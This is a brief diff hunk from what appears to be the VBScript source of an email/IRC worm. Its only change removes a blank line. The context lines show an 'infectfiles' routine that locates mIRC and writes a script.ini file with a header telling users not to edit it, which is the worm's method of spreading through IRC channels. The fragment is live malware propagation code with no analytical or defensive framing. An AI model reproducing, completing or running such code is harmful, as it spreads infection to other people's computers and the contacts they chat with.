@@ -153,7 +153,6 @@ Sub infectfiles(folderspec)
         Or (s = "mirc.hlp")
       Then
         Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
-        
         scriptini.WriteLine "[script]"
         scriptini.WriteLine ";mIRC Script"
         scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, If mIRC will"
